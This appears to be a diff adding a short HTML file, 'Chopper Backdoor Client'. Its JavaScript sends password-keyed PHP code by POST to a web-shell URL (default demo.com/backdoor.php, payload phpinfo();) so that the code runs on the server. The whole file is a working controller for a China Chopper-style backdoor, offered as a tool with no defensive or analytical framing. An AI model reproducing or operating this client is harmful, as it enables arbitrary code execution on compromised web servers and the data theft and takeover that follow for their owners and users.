@@ -1,0 +1,34 @@
+<html>
+<head><title>Chopper Backdoor Client</title>
+<meta http-equiv="content-type" content="text/html;charset=utf-8">
+<script type="text/javascript">
+function set_action(){
+    // chopper_pwd  ---- Be used to set the input value
+	// chopper_pass ---- PASSWORD to access the backdoor.
+	// chopper_form ---- FORM to post to the backdoor
+	var Backdoor_URL = document.getElementById("chopper_url");
+	var Backdoor_PWD = document.getElementById("chopper_pwd");
+
+        var Backdoor_form = document.getElementById("chopper_form");
+        var Backdoor_pass = document.getElementById("chopper_pass")
+
+	Backdoor_form.action = Backdoor_URL.value;
+        Backdoor_pass.name = Backdoor_PWD.value;
+
+        Backdoor_form.submit();
+}
+</script>
+</head>
+<body>
+Chopper Backdoor Client<br><br>
+<input type="text" id="chopper_url" size="80" value="http://demo.com/backdoor.php"> : Chopper Backdoor<br />
+<input type="text" id="chopper_pwd" size="80" value="password"> : Chopper Password<br />
+
+<form id="chopper_form" method="post">
+	<input type="text"  id="chopper_pass" size="80" value="phpinfo();"> :
+	<label onclick=set_action() style="border:1px">Click Here.</label>
+</form>
+</body>
+</html>
+
+
